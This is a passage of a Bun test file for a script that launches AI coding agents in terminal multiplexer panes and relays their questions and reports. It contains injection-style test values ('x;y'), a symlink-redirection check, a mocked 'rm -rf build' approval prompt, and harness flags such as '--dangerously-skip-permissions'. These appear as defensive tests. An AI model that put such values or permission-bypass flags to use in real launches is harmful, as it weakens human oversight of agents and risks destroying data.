import { afterEach, beforeEach, expect, test } from "bun:test";
import {
  chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import {
  askParent, briefText, close, detectMux, harnessArgs, launch, launchPrompt, list, nudgePrompt, panesRoot, peek, script, send, sh, waitFor,
} from "../plugins/pstack/skills/poteto-mode/scripts/pane-agent.mjs";

let root;
let brief;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "pstack-pane-"));
  brief = join(root, "task.md");
  writeFileSync(brief, "Review the diff.\n");
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

const herdrEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), HERDR_ENV: "1", HERDR_WORKSPACE_ID: "wP" });
const tuiosSelf = "98db8226-1829-468e-89a8-41a2baa0ddab";
const tuiosEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TUIOS_ENV: "1", TUIOS_SESSION: "work", TUIOS_PANE_ID: tuiosSelf });
const runDir = () => join(root, "panes", "arena-a");

const okJson = (result) => ({ status: 0, stdout: JSON.stringify({ id: "x", result }), stderr: "" });
const failJson = (code, message = code) => ({ status: 1, stdout: "", stderr: JSON.stringify({ error: { code, message } }) });
const agent = (status) => okJson({ agent: { agent_status: status } });
const text = (stdout) => ({ status: 0, stdout, stderr: "" });
const write = (file, body) => writeFileSync(join(runDir(), file), body);
const age = (file, seconds) => {
  const then = new Date(Date.now() - seconds * 1000);
  utimesSync(join(runDir(), file), then, then);
};

function scripted(rules) {
  const calls = [];
  const counters = new Map();
  const runner = (cmd, args) => {
    calls.push([cmd, ...args]);
    const key = Object.keys(rules).find((k) => `${cmd} ${args.join(" ")}`.startsWith(k));
    if (!key) throw new Error(`unscripted call: ${cmd} ${args.join(" ")}`);
    let rule = rules[key];
    if (Array.isArray(rule)) {
      const n = counters.get(key) ?? 0;
      counters.set(key, n + 1);
      rule = rule[Math.min(n, rule.length - 1)];
    }
    return typeof rule === "function" ? rule(args) : rule;
  };
  return { runner, calls };
}

const herdrBase = {
  "herdr tab create": okJson({ tab: { tab_id: "wP:t2" }, root_pane: { pane_id: "wP:p2" } }),
  "herdr agent start": okJson({ agent: { agent_status: "idle" } }),
  "herdr agent read": text("screen line one\nscreen line two\n\n"),
  "herdr tab close": okJson({ type: "ok" }),
  "herdr pane get": okJson({ pane: { agent_status: "working" } }),
};

const options = (extra = {}) => ({
  name: "arena-a", harness: "codex", model: "gpt-6.1-sol", effort: "xhigh", brief, cwd: root, ...extra,
});

test("harnessArgs builds each harness's launch flags from the registry", () => {
  const run = "/tmp/panes/arena-a";
  expect(harnessArgs("codex", { model: "gpt-6.1-sol", effort: "xhigh", access: "read", run })).toEqual([
    "-m", "gpt-6.1-sol", "-c", "model_reasoning_effort=xhigh", "-a", "never", "-s", "workspace-write", "--add-dir", run,
  ]);
  const claude = harnessArgs("claude", { model: "claude-opus-5-5", effort: null, access: "read", run });
  expect(claude.slice(0, 4)).toEqual(["--model", "claude-opus-5-5", "--permission-mode", "dontAsk"]);
  expect(claude).not.toContain("--effort");
  expect(claude[5]).toContain(`Edit(/${run}/question.md),Edit(/${run}/result.md)`);
  expect(claude).toContain("AskUserQuestion");
  const writer = harnessArgs("claude", { model: "m", effort: "max", access: "write", run });
  expect(writer).toContain("--effort");
  expect(writer.join(" ")).toContain("Edit,Write,Bash");
});

test("the claude read profile allows asking the parent and no other new command", () => {
  const args = harnessArgs("claude", { model: "m", effort: null, access: "read", run: "/tmp/panes/arena-a" });
  expect(args[args.indexOf("--allowedTools") + 1].split(",")).toEqual([
    "Read", "Grep", "Glob", "Edit(//tmp/panes/arena-a/question.md)", "Edit(//tmp/panes/arena-a/result.md)", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)",
    "Bash(git status:*)", "Bash(git blame:*)", "Bash(git rev-parse:*)", "Bash(git ls-files:*)", "Bash(git grep:*)",
    "Bash(rg:*)", "Bash(ls:*)", "Bash(wc:*)", `Bash(node ${script} ask-parent:*)`,
  ]);
});

test("a brief with a parent names the agent and tells it to ask the parent pane, then end its turn", () => {
  const run = join(root, "a");
  const out = briefText("x", { run, access: "write", name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
  expect(out).toContain("You are pane agent arena-a.");
  expect(out).toContain(`run \`node ${script} ask-parent --run ${run}\`, and end your turn. If that command fails, end your turn anyway`);
  expect(out).toContain("## Launching your own pane agents");
  expect(out).toContain(`node ${script} send --name <agent> --text <answer> --answer <questionId>`);
  expect(briefText("x", { run, access: "read", name: "arena-a", parent: null })).not.toContain("ask-parent");
});

test("the brief carries the pane protocol with this agent's paths", () => {
  const run = join(root, "a");
  const out = briefText("Do the thing.\n", { run, access: "read" });
  expect(out.startsWith("Do the thing.\n")).toBe(true);
  expect(out).toContain(`${join("skills", "poteto-mode", "SKILL.md")} before working`);
  expect(out).toContain(`write only the question to ${join(run, "question.md")}`);
  expect(out).toContain(`write your complete final report to ${join(run, "result.md")}`);
  expect(out).toContain(`Do not modify any file except ${join(run, "result.md")} and ${join(run, "question.md")}.`);
  expect(briefText("x", { run, access: "write" })).toContain("Change only what the task assigns");
});

test("herdr launch opens one labelled tab, starts the harness in it, prompts with --wait, and returns the result", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": () => { write("result.md", "verdict: ok\n"); return agent("done"); },
  });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out).toMatchObject({ verdict: "done", result: "verdict: ok\n", name: "arena-a", mux: "herdr", harness: "codex" });
  const [tab, start, prompt] = calls;
  expect(tab).toEqual(["herdr", "tab", "create", "--workspace", "wP", "--cwd", root, "--label", "arena-a", "--no-focus"]);
  expect(start.slice(0, 9)).toEqual(["herdr", "agent", "start", "arena-a", "--kind", "codex", "--pane", "wP:p2", "--timeout"]);
  expect(start.slice(start.indexOf("--", 3) + 1)).toEqual(expect.arrayContaining(["-m", "gpt-6.1-sol", "-a", "never", "-s", "workspace-write"]));
  expect(prompt.slice(0, 4)).toEqual(["herdr", "agent", "prompt", "arena-a"]);
  expect(prompt).toContain("--wait");
  expect(prompt[4]).toContain("brief.md");
  expect(readFileSync(join(runDir(), "brief.md"), "utf8")).toContain("Review the diff.");
});

test("a question written after a draft result is pending, and send answers it, clearing both files", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": [
      () => { write("result.md", "status\n"); age("result.md", 60); write("question.md", "Which branch?\n"); return agent("done"); },
      () => {
        expect(existsSync(join(runDir(), "question.md"))).toBe(false);
        expect(existsSync(join(runDir(), "result.md"))).toBe(false);
        write("result.md", "final\n");
        return agent("done");
      },
    ],
  });
  const first = launch(options(), { runner, env: herdrEnv() });
  expect(first).toMatchObject({ verdict: "question", question: "Which branch?\n" });
  const second = send("arena-a", { text: "main" }, { runner, env: herdrEnv() });
  expect(second).toMatchObject({ verdict: "done", result: "final\n" });
  expect(calls.filter((c) => c[2] === "prompt").at(-1)[4]).toBe("main");
});

test("a question the human answered in the pane no longer masks the result written after it", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": () => { write("question.md", "Which branch?\n"); return agent("done"); },
    "herdr agent wait": () => { write("result.md", "final\n"); age("question.md", 60); return agent("done"); },
  });
  expect(launch(options(), { runner, env: herdrEnv() })).toMatchObject({ verdict: "question" });
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "final\n" });
});

test("a relative pane directory is resolved before it reaches the brief or the harness flags", () => {
  const root = panesRoot({ PSTACK_PANES_DIR: "relative/panes" });
  expect(isAbsolute(root)).toBe(true);
  expect(root.endsWith(join("relative", "panes"))).toBe(true);
});

test("a blocked TUI comes back as a blocked verdict with the screen, without a poll loop", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_blocked") });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out).toMatchObject({ verdict: "blocked", screen: "screen line one\nscreen line two" });
  expect(calls.filter((c) => c[2] === "prompt")).toHaveLength(1);
});

test("a harness blocked at startup reports blocked and never sends the prompt", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent start": failJson("agent_not_ready", "trust dialog") });
  expect(launch(options(), { runner, env: herdrEnv() }).verdict).toBe("blocked");
  expect(calls.some((c) => c[2] === "prompt")).toBe(false);
});

test("a turn that ends with neither file is nudged once, then reported as no_result", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": agent("done") });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out.verdict).toBe("no_result");
  const prompts = calls.filter((c) => c[2] === "prompt");
  expect(prompts).toHaveLength(2);
  expect(prompts[1][4]).toBe(nudgePrompt(runDir()));
});

test("each text the parent sends starts a turn with its own reminder", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": agent("done") });
  expect(launch(options(), { runner, env: herdrEnv() }).verdict).toBe("no_result");
  expect(calls.filter((c) => c[2] === "prompt")).toHaveLength(2);
  expect(send("arena-a", { text: "try again" }, { runner, env: herdrEnv() }).verdict).toBe("no_result");
  const prompts = calls.filter((c) => c[2] === "prompt");
  expect(prompts).toHaveLength(4);
  expect(prompts[2][4]).toBe("try again");
  expect(prompts[3][4]).toBe(nudgePrompt(runDir()));
});

test("a dropped first prompt recovers when the nudge lands", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": [agent("done"), () => { write("result.md", "late\n"); return agent("done"); }],
  });
  expect(launch(options(), { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "late\n" });
});

test("a wait timeout reports timeout with the screen", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": failJson("timeout") });
  expect(launch(options({ timeoutMs: 1000 }), { runner, env: herdrEnv() }))
    .toMatchObject({ verdict: "timeout", screen: expect.stringContaining("screen line") });
});

test("wait resumes a blocked agent and peek reads its screen", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": failJson("agent_blocked"),
    "herdr agent wait": () => { write("result.md", "after human answered\n"); return agent("done"); },
  });
  launch(options(), { runner, env: herdrEnv() });
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "after human answered\n" });
  expect(peek("arena-a", { runner, env: herdrEnv() }).screen).toContain("screen line one");
});

test("a blocked full-screen TUI still shows its dialog through the visible screen", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": failJson("agent_blocked"),
    "herdr agent read": (args) => args.includes("visible")
      ? text("Do you trust the contents of this project?\n> Yes, I trust this folder\n")
      : failJson("agent_not_idle", "cannot read 60 lines while arena-a is blocked"),
  });
  const out = launch(options(), { runner, env: herdrEnv() });
  expect(out).toMatchObject({ verdict: "blocked", screen: expect.stringContaining("trust the contents") });
  expect(calls.filter((c) => c[2] === "read").map((c) => c[5])).toEqual(["recent-unwrapped", "visible"]);
});

test("send --keys maps key names, waits out the blocked state, then settles", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": failJson("agent_blocked"),
    "herdr agent send-keys": okJson({ type: "ok" }),
    "herdr agent get": [agent("blocked"), agent("working")],
    "herdr agent wait": () => { write("result.md", "approved\n"); return agent("done"); },
  });
  launch(options(), { runner, env: herdrEnv() });
  const out = send("arena-a", { keys: "Down Escape" }, { runner, env: herdrEnv() });
  expect(out.verdict).toBe("done");
  expect(calls.find((c) => c[2] === "send-keys")).toEqual(["herdr", "agent", "send-keys", "arena-a", "Down", "esc"]);
});

test("close removes the tab and the run directory, or keeps the directory on request", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  expect(list({ env: herdrEnv() }).map((a) => a.name)).toEqual(["arena-a"]);
  const kept = close("arena-a", { keep: true }, { runner, env: herdrEnv() });
  expect(kept.closed).toBe(true);
  expect(existsSync(join(runDir(), "result.md"))).toBe(true);
  close("arena-a", {}, { runner, env: herdrEnv() });
  expect(calls.filter((c) => c[2] === "close").map((c) => c[3])).toEqual(["wP:t2", "wP:t2"]);
  expect(existsSync(runDir())).toBe(false);
  expect(list({ env: herdrEnv() })).toEqual([]);
});

test("a failed launch tears down its tab and run directory", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent start": failJson("exec_failed", "no codex") });
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("agent start failed");
  expect(calls.some((c) => c[2] === "close")).toBe(true);
  expect(existsSync(runDir())).toBe(false);
});

test("launch refuses bad input before touching a multiplexer", () => {
  const { runner, calls } = scripted({});
  const env = herdrEnv();
  expect(() => launch(options({ name: "Arena A" }), { runner, env })).toThrow("--name must match");
  expect(() => launch(options({ harness: "nope" }), { runner, env })).toThrow("--harness must be one of");
  expect(() => launch(options({ effort: "turbo", harness: "claude", model: "m" }), { runner, env })).toThrow("Unsupported claude effort");
  expect(() => launch(options({ effort: "high", harness: "agy", model: "gemini-3.8-flash" }), { runner, env })).toThrow("name the effort in the model id (agy:gemini-3.8-flash-high)");
  expect(() => launch(options({ brief: join(root, "missing.md") }), { runner, env })).toThrow("--brief must name an existing file");
  expect(() => launch(options({ access: "root" }), { runner, env })).toThrow("--access is read or write");
  expect(calls).toEqual([]);
});

test("a second launch under a live name is refused", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("already exists");
});

test("detectMux picks the running multiplexer and refuses to guess", () => {
  expect(detectMux({ HERDR_ENV: "1" })).toBe("herdr");
  expect(detectMux({ TUIOS_ENV: "1" })).toBe("tuios");
  expect(detectMux({}, "tuios")).toBe("tuios");
  expect(() => detectMux({ HERDR_ENV: "1", TUIOS_ENV: "1" })).toThrow("pass --mux");
  expect(() => detectMux({})).toThrow("Not running inside herdr, tuios, or tmux");
});

test("detectMux finds tmux and names every multiplexer it finds when more than one is set", () => {
  expect(detectMux({ TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" })).toBe("tmux");
  expect(() => detectMux({ HERDR_ENV: "1", TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" }))
    .toThrow("More than one multiplexer is set in this environment (herdr, tmux)");
});

const tuiosState = (state) => ({ status: 0, stdout: JSON.stringify({ state }), stderr: "" });
const tuiosBase = {
  "tuios new-window": text("win-1\n"),
  "tuios capture-pane": text("tuios screen\n"),
  "tuios run-command": text("ok\n"),
};

test("tuios launch opens a named window that runs the harness with the prompt, then waits on events in two phases", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("idle"), tuiosState("working"), tuiosState("done")],
    "tuios wait-for": (args) => {
      if (args.includes("idle,done,needs_input,errored")) write("result.md", "tuios result\n");
      return text("");
    },
  });
  const out = launch(options(), { runner, env: tuiosEnv() });
  expect(out).toMatchObject({ verdict: "done", result: "tuios result\n", mux: "tuios" });
  const open = calls[0];
  expect(open.slice(0, 9)).toEqual(["tuios", "new-window", "-s", "work", "arena-a", "--cwd", root, "--no-focus", "--print-id"]);
  const argv = open.slice(open.indexOf("--", 3) + 1);
  expect(argv[0]).toBe("codex");
  expect(argv.at(-1)).toContain("brief.md");
  const waits = calls.filter((c) => c[1] === "wait-for").map((c) => c[c.indexOf("--until") + 1]);
  expect(waits).toEqual(["working,needs_input,errored,done", "idle,done,needs_input,errored"]);
});

test("tuios puts the prompt before the flags for a harness with variadic tool flags", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options({ harness: "claude", model: "claude-opus-5-5", effort: "high" }), { runner, env: tuiosEnv() });
  const argv = calls[0].slice(calls[0].indexOf("--", 3) + 1);
  expect(argv[0]).toBe("claude");
  expect(argv[1]).toContain("brief.md");
  expect(argv[2]).toBe("--model");
});

test("tuios hands a harness its prompt through the registry's prompt template, after the flags", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options({ harness: "agy", model: "gemini-3.8-flash-high", effort: null }), { runner, env: tuiosEnv() });
  const argv = calls[0].slice(calls[0].indexOf("--", 3) + 1);
  expect(argv.slice(0, 4)).toEqual(["agy", "--model", "gemini-3.8-flash-high", "--dangerously-skip-permissions"]);
  expect(argv.slice(4, 6)).toEqual(["--add-dir", runDir()]);
  expect(argv[6]).toBe("-i");
  expect(argv[7]).toContain("brief.md");
  expect(argv).toHaveLength(8);
});

test("tuios passes a bare prompt last to a harness with no prompt template", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options({ harness: "grok", model: "grok-4.7", effort: "high" }), { runner, env: tuiosEnv() });
  const argv = calls[0].slice(calls[0].indexOf("--", 3) + 1);
  expect(argv.slice(0, 6)).toEqual(["grok", "-m", "grok-4.7", "--reasoning-effort", "high", "--always-approve"]);
  expect(argv).toHaveLength(7);
  expect(argv[6]).toContain("brief.md");
});

test("tuios reports a needs_input agent as blocked using its own prompt reader", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("needs_input"),
    "tuios wait-for": text(""),
    "tuios peek-prompt": text("Allow Bash: rm -rf build? [y/n]\n"),
  });
  const out = launch(options(), { runner, env: tuiosEnv() });
  expect(out).toMatchObject({ verdict: "blocked", screen: "Allow Bash: rm -rf build? [y/n]" });
  expect(calls.some((c) => c[1] === "capture-pane")).toBe(false);
});

test("a tuios window that vanished is an error verdict, not a hang", () => {
  const gone = { status: 1, stdout: "", stderr: "window not found" };
  const { runner } = scripted({ ...tuiosBase, "tuios get-agent-state": gone, "tuios wait-for": gone });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "error", detail: expect.stringContaining("gone") });
});

test("tuios send goes through ask-agent and close closes the window by name", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
    "tuios ask-agent": () => { write("result.md", "second\n"); return text("answer printed\n"); },
  });
  launch(options(), { runner, env: tuiosEnv() });
  expect(send("arena-a", { text: "use main" }, { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "second\n" });
  const ask = calls.find((c) => c[1] === "ask-agent");
  expect(ask).toContain("use main");
  expect(ask.slice(ask.indexOf("--from"), ask.indexOf("--from") + 2)).toEqual(["--from", tuiosSelf]);
  close("arena-a", {}, { runner, env: tuiosEnv() });
  expect(calls.at(-1)).toEqual(["tuios", "run-command", "-s", "work", "CloseWindow", "arena-a"]);
});

const prompts = (calls) => calls.filter((c) => c[2] === "prompt");

test("herdr launch --no-wait leaves the brief for wait to deliver, exactly once", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent wait": agent("idle"),
    "herdr agent prompt": () => { write("result.md", "delivered late\n"); return agent("done"); },
  });
  expect(launch(options({ wait: false }), { runner, env: herdrEnv() })).toMatchObject({ launched: true });
  expect(prompts(calls)).toHaveLength(0);
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "delivered late\n" });
  expect(prompts(calls)).toHaveLength(1);
  expect(prompts(calls)[0][4]).toBe(launchPrompt(runDir()));
});

test("a startup dialog the human clears is followed by the brief, not by no_result", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent start": failJson("agent_not_ready", "trust dialog"),
    "herdr agent wait": agent("idle"),
    "herdr agent prompt": () => { write("result.md", "after trust\n"); return agent("done"); },
  });
  expect(launch(options(), { runner, env: herdrEnv() }).verdict).toBe("blocked");
  expect(prompts(calls)).toHaveLength(0);
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done", result: "after trust\n" });
  expect(prompts(calls)).toHaveLength(1);
  expect(prompts(calls)[0][4]).toBe(launchPrompt(runDir()));
});

test("a wait that is still blocked at startup does not send the brief", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent start": failJson("agent_not_ready", "login"),
    "herdr agent wait": agent("blocked"),
  });
  launch(options(), { runner, env: herdrEnv() });
  expect(waitFor("arena-a", {}, { runner, env: herdrEnv() }).verdict).toBe("blocked");
  expect(prompts(calls)).toHaveLength(0);
});

test("a prompt herdr reports as stalled is not typed a second time", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_prompt_stalled") });
  expect(launch(options(), { runner, env: herdrEnv() })).toMatchObject({ verdict: "stalled", screen: expect.stringContaining("screen line") });
  expect(prompts(calls)).toHaveLength(1);
});

test("a failed tab create surfaces the herdr error and leaves nothing behind", () => {
  const { runner } = scripted({ "herdr tab create": failJson("workspace_not_found", "no such workspace") });
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("tab create failed: workspace_not_found");
  expect(existsSync(runDir())).toBe(false);
  expect(list({ env: herdrEnv() })).toEqual([]);
});

test("a missing multiplexer binary names the cause instead of an empty message", () => {
  const missing = sh("pstack-no-such-binary", []);
  expect(missing.status).not.toBe(0);
  expect(missing.stderr).toContain("pstack-no-such-binary");
});

test("launch refuses a model or effort that could be read as a flag", () => {
  const { runner, calls } = scripted({});
  expect(() => launch(options({ model: "-m" }), { runner, env: herdrEnv() })).toThrow("--model");
  expect(() => launch(options({ model: "a b" }), { runner, env: herdrEnv() })).toThrow("--model");
  expect(() => launch(options({ effort: "x;y" }), { runner, env: herdrEnv() })).toThrow("--effort");
  expect(calls).toEqual([]);
});

test("send types text that starts with a dash as text, not as a flag", () => {
  const { runner, calls } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  send("arena-a", { text: "--force is fine" }, { runner, env: herdrEnv() });
  expect(prompts(calls).at(-1)[4]).toBe(" --force is fine");
});

test("send keeps the previous report as a .prev file instead of deleting it", () => {
  const { runner } = scripted({
    ...herdrBase,
    "herdr agent prompt": [() => { write("result.md", "first\n"); return agent("done"); }, failJson("agent_not_found")],
  });
  launch(options(), { runner, env: herdrEnv() });
  expect(send("arena-a", { text: "again" }, { runner, env: herdrEnv() }).verdict).toBe("error");
  expect(readFileSync(join(runDir(), "result.md.prev"), "utf8")).toBe("first\n");
});

test("a state file that names another run directory is refused", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
  launch(options(), { runner, env: herdrEnv() });
  const path = join(runDir(), "state.json");
  writeFileSync(path, JSON.stringify({ ...JSON.parse(readFileSync(path, "utf8")), run: join(root, "elsewhere") }));
  expect(() => close("arena-a", {}, { runner, env: herdrEnv() })).toThrow("different run directory");
});

test("an empty or corrupt state.json elsewhere is skipped by launch and list", () => {
  for (const [entry, body] of [["empty", ""], ["torn", '{"name": "torn", "mux": "her']]) {
    mkdirSync(join(root, "panes", entry), { recursive: true, mode: 0o700 });
    writeFileSync(join(root, "panes", entry, "state.json"), body);
  }
  const { runner } = doneHerdr();
  const env = { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" };
  expect(launch(options(), { runner, env })).toMatchObject({ name: "arena-a", verdict: "done" });
  expect(list({ env }).map((a) => a.name)).toEqual(["arena-a"]);
});

test("state is saved by replacing state.json, never by writing through it", () => {
  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_blocked") });
  launch(options(), { runner, env: herdrEnv() });
  const path = join(runDir(), "state.json");
  const outside = join(root, "outside.json");
  const before = readFileSync(path, "utf8");
  writeFileSync(outside, before);
  rmSync(path);
  symlinkSync(outside, path);
  send("arena-a", { text: "go on" }, { runner, env: herdrEnv() });
  expect(readFileSync(outside, "utf8")).toBe(before);
  expect(lstatSync(path).isSymbolicLink()).toBe(false);
  expect(readdirSync(runDir()).filter((f) => f.endsWith(".tmp"))).toEqual([]);
});

test.skipIf(typeof process.getuid !== "function")("a shared, world-writable panes directory is refused", () => {
  const { runner, calls } = scripted({});
  mkdirSync(join(root, "panes"));
  chmodSync(join(root, "panes"), 0o777);
  expect(() => launch(options(), { runner, env: herdrEnv() })).toThrow("no one else can write to");
  expect(calls).toEqual([]);
});

test("tuios treats state none as working until it sees activity or a report", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("none"),
    "tuios wait-for": [{ status: 1, stdout: "", stderr: "timeout" }, () => { write("result.md", "no hooks\n"); return text(""); }],
  });
  const out = launch(options(), { runner, env: tuiosEnv() });
  expect(out).toMatchObject({ verdict: "done", result: "no hooks\n" });
  expect(calls.filter((c) => c[1] === "ask-agent")).toHaveLength(0);
});

test("tuios reports stalled when the turn never starts and does not type a nudge into it", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("idle"),
    "tuios wait-for": { status: 1, stdout: "", stderr: "timeout" },
  });
  expect(launch(options({ timeoutMs: 1500 }), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "stalled", screen: "tuios screen" });
  expect(calls.filter((c) => c[1] === "ask-agent")).toHaveLength(0);
});

const slices = (calls) => calls.filter((c) => c[1] === "wait-for").map((c) => Number(c[c.indexOf("--timeout") + 1]));

test("a hookless tuios pane is checked for report files every few seconds from the first wait", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("none"),
    "tuios wait-for": [{ status: 1, stdout: "", stderr: "timeout" }, () => { write("result.md", "hookless\n"); return { status: 1, stdout: "", stderr: "timeout" }; }],
  });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "hookless\n" });
  expect(Math.max(...slices(calls))).toBeLessThanOrEqual(5000);
});

test("a tuios agent whose state hook was lost still ends its turn when it reports", () => {
  for (const state of ["working", "unknown"]) {
    const { runner, calls } = scripted({
      ...tuiosBase,
      "tuios get-agent-state": state === "unknown" ? text("not json") : tuiosState(state),
      "tuios wait-for": () => { write("result.md", `lost ${state}\n`); return { status: 1, stdout: "", stderr: "timeout" }; },
    });
    expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: `lost ${state}\n` });
    expect(Math.max(...slices(calls))).toBeLessThanOrEqual(5000);
    rmSync(runDir(), { recursive: true, force: true });
  }
});

test("a tuios state read that cannot be parsed while wait-for succeeds at once is paced, not spun", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": text("not json"),
    "tuios wait-for": text(""),
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  const started = Date.now();
  expect(waitFor("arena-a", { timeoutMs: 1000 }, { runner, env: tuiosEnv() }).verdict).toBe("stalled");
  expect(Date.now() - started).toBeGreaterThanOrEqual(900);
  expect(calls.filter((c) => c[1] === "get-agent-state").length).toBeLessThan(8);
});

const savedState = () => JSON.parse(readFileSync(join(runDir(), "state.json"), "utf8"));

test("a tuios wait after a delivered question blocks while the agent works instead of returning the same question", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done"), tuiosState("working"), tuiosState("working"), tuiosState("done")],
    "tuios wait-for": [
      () => { write("question.md", "Which branch?\n"); return text(""); },
      () => { write("result.md", "final\n"); age("question.md", 60); return text(""); },
    ],
  });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({ verdict: "question", question: "Which branch?\n" });
  const before = calls.filter((c) => c[1] === "wait-for").length;
  expect(waitFor("arena-a", {}, { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "final\n" });
  expect(calls.filter((c) => c[1] === "wait-for").length).toBeGreaterThan(before);
});

test("a dialog that opens after a delivered question is reported as blocked, with the question alongside", () => {
  const { runner } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": () => { write("question.md", "Which branch?\n"); return tuiosState("needs_input"); },
    "tuios peek-prompt": text("Allow Bash: git push? [y/n]\n"),
  });
  expect(launch(options(), { runner, env: tuiosEnv() })).toMatchObject({
    verdict: "blocked", screen: "Allow Bash: git push? [y/n]", question: "Which branch?\n",
  });
});

test("send --keys after a startup dialog waits for the first turn to start before it judges the turn over", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("needs_input"), tuiosState("idle"), tuiosState("idle"), tuiosState("idle"), tuiosState("working"), tuiosState("idle")],
    "tuios wait-for": text(""),
    "tuios send-keys": text(""),
    "tuios ask-agent": text("nudged\n"),
  });
  expect(launch(options(), { runner, env: tuiosEnv() }).verdict).toBe("blocked");
  expect(savedState().awaitTurn).toBe(true);
  send("arena-a", { keys: "Enter" }, { runner, env: tuiosEnv() });
  const afterKeys = calls.slice(calls.findIndex((c) => c[1] === "send-keys"));
  expect(afterKeys.find((c) => c[1] === "wait-for")).toContain("working,needs_input,errored,done");
  expect(savedState().awaitTurn).toBe(false);
});

test("the turn-start wait is dropped once a turn is seen, and kept when a short timeout ends first", () => {
  const { runner } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("working"), tuiosState("idle")],
    "tuios wait-for": text(""),
    "tuios ask-agent": text("nudged\n"),
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  expect(savedState().awaitTurn).toBe(true);
